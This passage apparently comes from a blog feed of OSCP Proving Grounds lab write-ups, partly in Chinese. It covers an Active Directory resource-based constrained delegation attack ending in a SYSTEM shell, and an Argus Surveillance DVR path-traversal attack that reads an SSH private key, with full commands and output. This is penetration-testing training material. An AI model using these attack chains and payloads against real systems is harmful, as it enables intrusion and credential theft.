class="string">&quot;targetAccount&quot;</span> --action <span class="string">&quot;add&quot;</span></span><br><span class="line">For other optional parameters<span class="punctuation">,</span> view the pyWhisker documentation.</span><br></pre></td></tr></table></figure>

<blockquote>
<p>rbcd: <a href="https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py</a></p>
</blockquote>
<p><strong>Let’s use our access with the <code>l.livingstone</code> account to create a new machine account on the domain. We can do with by using <code>impacket-addcomputer</code>.</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&gt; impacket-addcomputer resourced.local/l.livingstone -dc-ip <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> -hashes <span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808 -computer-name &#x27;ATTACK$&#x27; -computer-pass &#x27;AttackerPC1!&#x27;</span><br><span class="line"></span><br><span class="line">Impacket v0<span class="number">.12</span><span class="number">.0</span> - Copyright Fortra<span class="punctuation">,</span> LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Successfully added machine account ATTACK$ with password AttackerPC1!.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>We can verify that this machine account was added to the domain by using our <code>evil-winrm</code> session from before.</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C<span class="punctuation">:</span>\Users\L.Livingstone\Documents&gt; get-adcomputer attack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DistinguishedName <span class="punctuation">:</span> CN=ATTACK<span class="punctuation">,</span>CN=Computers<span class="punctuation">,</span>DC=resourced<span class="punctuation">,</span>DC=local</span><br><span class="line">DNSHostName       <span class="punctuation">:</span></span><br><span class="line">Enabled           <span class="punctuation">:</span> True</span><br><span class="line">Name              <span class="punctuation">:</span> ATTACK</span><br><span class="line">ObjectClass       <span class="punctuation">:</span> computer</span><br><span class="line">ObjectGUID        <span class="punctuation">:</span> <span class="number">3</span>fe60405<span class="number">-3692</span><span class="number">-4</span>de9<span class="number">-8</span>a20<span class="number">-917</span>b234741b9</span><br><span class="line">SamAccountName    <span class="punctuation">:</span> ATTACK$</span><br><span class="line">SID               <span class="punctuation">:</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-537427935</span><span class="number">-490066102</span><span class="number">-1511301751</span><span class="number">-3601</span></span><br><span class="line">UserPrincipalName <span class="punctuation">:</span></span><br></pre></td></tr></table></figure>

<p>With this account added, we now need a python script to help us manage the delegation rights. Let’s grab a copy of rbcd.py and use it to set msDS-AllowedToActOnBehalfOfOtherIdentity on our new machine account.</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&gt; wget https<span class="punctuation">:</span><span class="comment">//raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py </span></span><br><span class="line"></span><br><span class="line">&gt; python rdbc.py -dc-ip <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span> -t RESOURCEDC -f &#x27;ATTACK&#x27; -hashes <span class="punctuation">:</span><span class="number">19</span>a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone</span><br><span class="line">Impacket v0<span class="number">.12</span><span class="number">.0</span> - Copyright Fortra<span class="punctuation">,</span> LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Starting Resource Based Constrained Delegation Attack against RESOURCEDC$</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Initializing LDAP connection to <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Using resourced\l.livingstone account with password ***</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> LDAP bind OK</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Initializing domainDumper()</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Initializing LDAPAttack()</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Delegation rights modified succesfully!</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy</span><br></pre></td></tr></table></figure>

<p>We can confirm that this was successful by using our <code>evil-winrm</code> session.</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C<span class="punctuation">:</span>\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity</span><br><span class="line"></span><br><span class="line">Path Owner                  Access</span><br><span class="line">---- -----                  ------</span><br><span class="line">     BUILTIN\Administrators resourced\ATTACK$ Allow</span><br></pre></td></tr></table></figure>

<p>We now need to get the administrator service ticket. We can do this by using <code>impacket-getST</code> with our privileged machine account.</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&gt; impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$<span class="punctuation">:</span>&#x27;AttackerPC1!&#x27; -impersonate Administrator -dc-ip <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span></span><br><span class="line">Impacket v0<span class="number">.12</span><span class="number">.0</span> - Copyright Fortra<span class="punctuation">,</span> LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Getting TGT for user</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Impersonating Administrator</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py<span class="punctuation">:</span><span class="number">380</span><span class="punctuation">:</span> DeprecationWarning<span class="punctuation">:</span> datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC<span class="punctuation">:</span> datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow()</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py<span class="punctuation">:</span><span class="number">477</span><span class="punctuation">:</span> DeprecationWarning<span class="punctuation">:</span> datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC<span class="punctuation">:</span> datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">1</span>)</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Requesting S4U2self</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py<span class="punctuation">:</span><span class="number">607</span><span class="punctuation">:</span> DeprecationWarning<span class="punctuation">:</span> datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC<span class="punctuation">:</span> datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow()</span><br><span class="line">/usr/share/doc/python3-impacket/examples/getST.py<span class="punctuation">:</span><span class="number">659</span><span class="punctuation">:</span> DeprecationWarning<span class="punctuation">:</span> datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC<span class="punctuation">:</span> datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">1</span>)</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Requesting S4U2Proxy</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This saved the ticket on our Kali host as <strong>Administrator.ccache</strong>. We need to export a new environment variable named <code>KRB5CCNAME</code> with the location of this file.</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&gt; export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache</span><br></pre></td></tr></table></figure>

<p>Now, all we have to do is add a new entry in <strong>&#x2F;etc&#x2F;hosts</strong> to point <code>resourcedc.resourced.local</code> to the target IP address and run <code>impacket-psexec</code> to drop us into a system shell.</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">└─$ sudo sh -c &#x27;echo <span class="string">&quot;192.168.120.181 resourcedc.resourced.local&quot;</span> &gt;&gt; /etc/hosts&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&gt; impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip <span class="number">192.168</span><span class="number">.197</span><span class="number">.175</span></span><br><span class="line">Impacket v0<span class="number">.12</span><span class="number">.0</span> - Copyright Fortra<span class="punctuation">,</span> LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Requesting shares on resourcedc.resourced.local.....</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Found writable share ADMIN$</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Uploading file xwXtzaPl.exe</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Opening SVCManager on resourcedc.resourced.local.....</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Creating service oEXO on resourcedc.resourced.local.....</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Starting service oEXO.....</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> Press help for extra shell commands</span><br><span class="line">Microsoft Windows <span class="punctuation">[</span>Version <span class="number">10.0</span><span class="number">.17763</span><span class="number">.2145</span><span class="punctuation">]</span></span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt; whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<p>done</p>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Shenzi</title>
    <url>/post/20250226023557.html</url>
    <content><![CDATA[<h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>Medium</p>
<h1 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">OS: Windows <span class="number">10</span>, Windows Server <span class="number">2019</span>, Windows Server <span class="number">2016</span></span><br><span class="line">OS version: <span class="string">&#x27;10.0&#x27;</span></span><br><span class="line">OS release: <span class="string">&#x27;2004&#x27;</span></span><br><span class="line">OS build: <span class="string">&#x27;19041&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ssh found on tcp/<span class="number">22</span>.</span><br><span class="line">     Bitvise WinSSHD <span class="number">8.48</span> (FlowSsh <span class="number">8.48</span>; protocol <span class="number">2.0</span>; non<span class="literal">-commercial</span> use)</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/<span class="number">135</span>.</span><br><span class="line"></span><br><span class="line">[*] netbios<span class="literal">-ssn</span> found on tcp/<span class="number">139</span>.</span><br><span class="line"></span><br><span class="line">[*] microsoft<span class="literal">-ds</span> found on tcp/<span class="number">445</span>.</span><br><span class="line">    SMB <span class="number">3.0</span></span><br><span class="line"></span><br><span class="line">[*] http<span class="literal">-proxy</span> found on tcp/<span class="number">8080</span>.</span><br><span class="line">    &lt;meta name=<span class="string">&quot;GENERATOR&quot;</span> content=<span class="string">&quot;Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]&quot;</span>&gt;</span><br><span class="line">        About the program:</span><br><span class="line"> </span><br><span class="line">    Argus Surveillance DVR</span><br><span class="line">    Program is UNREGISTERED</span><br><span class="line">    Version: <span class="number">4.0</span></span><br><span class="line">    Released <span class="number">18</span>/<span class="number">12</span>/<span class="number">2008</span></span><br><span class="line">    Argus Surveillance Inc.</span><br><span class="line"></span><br><span class="line">    http<span class="literal">-vuln-cve2011-3368</span>:</span><br><span class="line">    CVE:CVE<span class="literal">-2005-3299</span>  phpmyadmin</span><br><span class="line"></span><br><span class="line">[*] unknown found on tcp/<span class="number">5040</span>.</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49664</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49665</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49666</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49667</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49668</span>.</span><br><span class="line">[*] msrpc found on tcp/<span class="number">49669</span>.</span><br></pre></td></tr></table></figure>

<h1 id="22-WinSSHD"><a href="#22-WinSSHD" class="headerlink" title="22 WinSSHD"></a>22 WinSSHD</h1><p>windows下的sshd实现，和linux一样在用户.ssh目录下会有公私钥相关文件</p>
<p>8.48版本没有搜索到可利用的已知漏洞</p>
<h2 id="445-SMB"><a href="#445-SMB" class="headerlink" title="445 SMB"></a>445 SMB</h2><p>无法匿名登录</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">smbclient <span class="literal">-L</span> //<span class="number">192.168</span>.<span class="number">140.179</span> <span class="literal">-N</span></span><br><span class="line">session setup failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<h2 id="8080-Argus-Surveillance-DVR"><a href="#8080-Argus-Surveillance-DVR" class="headerlink" title="8080 Argus Surveillance DVR"></a>8080 Argus Surveillance DVR</h2><p>进入后在user下发现两个用户名，administrator和viewer, 看到有修改密码选项，并且不需要输入原密码，把密码改成123， 然后通过ssh登录，提示密码不正确， gobuster目录扫描也没有收获</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-107.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-106.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-105.png.png"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh viewer@<span class="number">192.168</span>.<span class="number">140.179</span> </span><br><span class="line">viewer@<span class="number">192.168</span>.<span class="number">140.179</span><span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">viewer@192.168.140.179&#x27;</span>s password: </span><br><span class="line">                                      </span><br></pre></td></tr></table></figure>

<p>searchSploit搜一下已知漏洞，全部复制过来看看说明</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-110.png.png"></p>
<p>50261 是没有引号的service路径，后面可能提权有用，但是poc里面也没有利用方法</p>
<p>50130 弱密码破解，并有提示arugs Surveillance DVR的配置路径，看代码是把加密的字符串按4位字符一组的解码</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-113.png.png"></p>
<p>45296 路径穿越，poc直接测一下, 有结果返回，可以利用，但是能读什么呢</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&amp;USEREDIRECT=1&amp;WEBACCOUNTID=&amp;WEBACCOUNTPASSWORD=&quot;</span></span><br><span class="line">; <span class="keyword">for</span> <span class="number">16</span><span class="literal">-bit</span> app support</span><br><span class="line">[<span class="number">386</span><span class="type">Enh</span>]</span><br><span class="line">woafont=dosapp.fon</span><br><span class="line">EGA80WOA.FON=EGA80WOA.FON</span><br><span class="line">EGA40WOA.FON=EGA40WOA.FON</span><br><span class="line">CGA80WOA.FON=CGA80WOA.FON</span><br><span class="line">CGA40WOA.FON=CGA40WOA.FON</span><br><span class="line"></span><br><span class="line">[<span class="type">drivers</span>]</span><br><span class="line">wave=mmdrv.dll</span><br><span class="line">timer=timer.drv</span><br><span class="line"></span><br><span class="line">[<span class="type">mci</span>]</span><br></pre></td></tr></table></figure>

<p>45312 提权： 在Argus 应用文件夹下放一个恶意 <code>gsm_codec.dll</code>,这个dll会被以SYSTEM账号执行</p>
<h1 id="FootHold"><a href="#FootHold" class="headerlink" title="FootHold"></a>FootHold</h1><p>4种exploit 暂时能利用的是路径穿越，结合其他信息，能读的有administrator和viewer的私钥、<code>C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini</code> 配置信息。</p>
<ol>
<li>成功读到了viewer账号的私钥</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fadministrator%2F.ssh%2Fid_rsa&quot;</span></span><br><span class="line">&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;File Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;Cannot find this file.&lt;/H1&gt;The requested file: &lt;B&gt;/WEBACCOUNT.CGI?OkBtn=  Ok  &amp;RESULTPAGE=../../../../../../../../../../../../../../../../Users/administrator/.ssh/id_rsa&lt;/B&gt; was not found.&lt;/BODY&gt;&lt;/HTML&gt;                                                                                                                                               </span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa&quot;</span></span><br><span class="line"><span class="literal">-----BEGIN</span> OPENSSH PRIVATE KEY<span class="literal">-----</span></span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAuuXhjQJhDjXBJkiIftPZng7N999zteWzSgthQ5fs9kOhbFzLQJ5J</span><br><span class="line">Ybut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAP</span><br><span class="line">iJ/njNKI0tjtpeO3rjGMkKgNKwvv3y2EcCEt1d+LxsO3Wyb5ezuPT349v+MVs7VW04+mGx</span><br><span class="line">pgheMgbX6HwqGSo9z38QetR6Ryxs+LVX49Bjhskz19gSF4/iTCbqoRo0djcH54fyPOm3OS</span><br></pre></td></tr></table></figure>

<p>登录</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ssh viewer@<span class="number">192.168</span>.<span class="number">140.179</span> <span class="literal">-i</span> viewer.id_rsa</span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.19044.1645</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\viewer&gt;whoami</span><br><span class="line">dvr4\viewer</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>读配置文件, 没有和用户密码相关的信息</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.140.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus%20Surveillance%20DVR%2FDVRParams.ini&quot;</span></span><br><span class="line">[<span class="type">Main</span>]</span><br><span class="line">ServerName=</span><br><span class="line">ServerLocation=</span><br><span class="line">ServerDescription=</span><br><span class="line">ReadH=<span class="number">0</span></span><br><span class="line">UseDialUp=<span class="number">0</span></span><br><span class="line">DialUpConName=</span><br><span class="line">DialUpDisconnectWhenDone=<span class="number">0</span></span><br><span class="line">DIALUPUSEDEFAULTS<span class="string">&quot; checked checked</span></span><br></pre></td></tr></table></figure>

<h1 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h1><h3 id="SeShutdownPrivilege"><a href="#SeShutdownPrivilege" class="headerlink" title="SeShutdownPrivilege"></a>SeShutdownPrivilege</h3><p>查了下viewer账号下所有文件夹，什么都没有， 在C:下发现了一个output.txt文件，查看内容是以administrator账户执行了 <code>C:\freezeScript\win10.ps1</code>, 运行时间是靶机启动时间</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-112.png.png"></p>
<p>查看脚本的内容，发现C:下 freezeScript文件夹都没有，如果viewer账户可以重启机器，并且有C:写权限的话就可以获得adminstrator权限执行任意代码，查看权限显示有seShutdownPrivilege，写一个把viewer加入administrators group脚本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                          State  </span><br><span class="line">============================= ==================================== =======</span><br><span class="line">SeShutdownPrivilege           Shut down the system                 Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled</span><br><span class="line">SeUndockPrivilege             Remove computer from docking station Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span>       Enabled</span><br><span class="line">SeTimeZonePrivilege           Change the time zone                 Enabled</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">md</span> freezeScript</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                        </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                        </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">36</span> AM                freezeScript                                                                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cd</span> .\freezeScript\</span><br><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt;  <span class="string">&#x27;Add-LocalGroupMember -Group &quot;Administrators&quot; -Member &quot;viewer&quot;&#x27;</span>| <span class="built_in">Out-File</span> <span class="literal">-FilePath</span> <span class="string">&quot;C:\freezeScript\win10.ps1&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt; <span class="built_in">cat</span> win10.ps1</span><br><span class="line"><span class="built_in">Add-LocalGroupMember</span> <span class="literal">-Group</span> <span class="string">&quot;Administrators&quot;</span> <span class="literal">-Member</span> <span class="string">&quot;viewer&quot;</span></span><br></pre></td></tr></table></figure>

<p>重启时提示无权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt; shutdown /<span class="built_in">r</span> /t <span class="number">0</span></span><br><span class="line">Access is denied.(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p>GPT的回答</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">尽管你有 SeShutdownPrivilege 权限，这个错误通常是由于缺少管理员权限导致的。在 PowerShell 或命令提示符中执行 shutdown 命令需要管理员权限，即使你有相关权限，也需要以管理员身份运行 PowerShell。</span><br></pre></td></tr></table></figure>

<h3 id="winpeas"><a href="#winpeas" class="headerlink" title="winpeas"></a>winpeas</h3><p>上传winpeas执行也没有得到有用信息。viewer的权限也比较低，很多内容收集不到。</p>
<h3 id="DRV4配置"><a href="#DRV4配置" class="headerlink" title="DRV4配置"></a>DRV4配置</h3><p>再确认下配置文件， dir发现没有ProgramData文件夹，但是前面已经读到配置文件了，文件夹应该是存在的，<code>dir -froce</code>查看是被隐藏了</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\freezeScript&gt; <span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                        </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                        </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">40</span> AM                freezeScript                                                                                </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">6</span>:<span class="number">08</span> AM                Microsoft                                                                                   </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">7</span>/<span class="number">2019</span>   <span class="number">1</span>:<span class="number">14</span> AM                PerfLogs                                                                                    </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Program Files                                                                               </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>   <span class="number">5</span>:<span class="number">55</span> AM                Program Files (x86)                                                                         </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">21</span> AM                Users                                                                                       </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Windows                                                                                     </span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">4</span>:<span class="number">52</span> AM           <span class="number">2690</span> output.txt                                                                                  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">dir</span> <span class="literal">-force</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                                                                                        </span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span>                                                                                        </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">5</span>:<span class="number">06</span> AM                <span class="variable">$Recycle</span>.Bin                                                                                </span><br><span class="line">d<span class="literal">--h--</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">5</span>:<span class="number">02</span> AM                <span class="variable">$WinREAgent</span>                                                                                 </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">08</span> AM                Config.Msi                                                                                  </span><br><span class="line">d<span class="literal">--hsl</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">10</span>:<span class="number">28</span> AM                Documents and Settings                                                                      </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">9</span>:<span class="number">40</span> AM                freezeScript                                                                                </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">2</span>/<span class="number">21</span>/<span class="number">2025</span>   <span class="number">6</span>:<span class="number">08</span> AM                Microsoft                                                                                   </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">12</span>/<span class="number">7</span>/<span class="number">2019</span>   <span class="number">1</span>:<span class="number">14</span> AM                PerfLogs                                                                                    </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Program Files                                                                               </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>   <span class="number">5</span>:<span class="number">55</span> AM                Program Files (x86)                                                                         </span><br><span class="line">d<span class="literal">--h--</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">24</span> AM                ProgramData                                                                                 </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">3</span>/<span class="number">11</span>/<span class="number">2022</span>  <span class="number">10</span>:<span class="number">03</span> PM                Recovery                                                                                    </span><br><span class="line">d<span class="literal">--hs-</span>         <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span>   <span class="number">3</span>:<span class="number">31</span> AM                System Volume Information                                                                   </span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">12</span>/<span class="number">3</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">21</span> AM                Users                                                                                       </span><br><span class="line">d<span class="literal">-----</span>         <span class="number">4</span>/<span class="number">15</span>/<span class="number">2022</span>   <span class="number">7</span>:<span class="number">07</span> AM                Windows                                                                                     </span><br><span class="line"><span class="literal">-a-hs-</span>          <span class="number">8</span>/<span class="number">1</span>/<span class="number">2024</span>  <span class="number">10</span>:<span class="number">33</span> PM           <span class="number">8192</span> 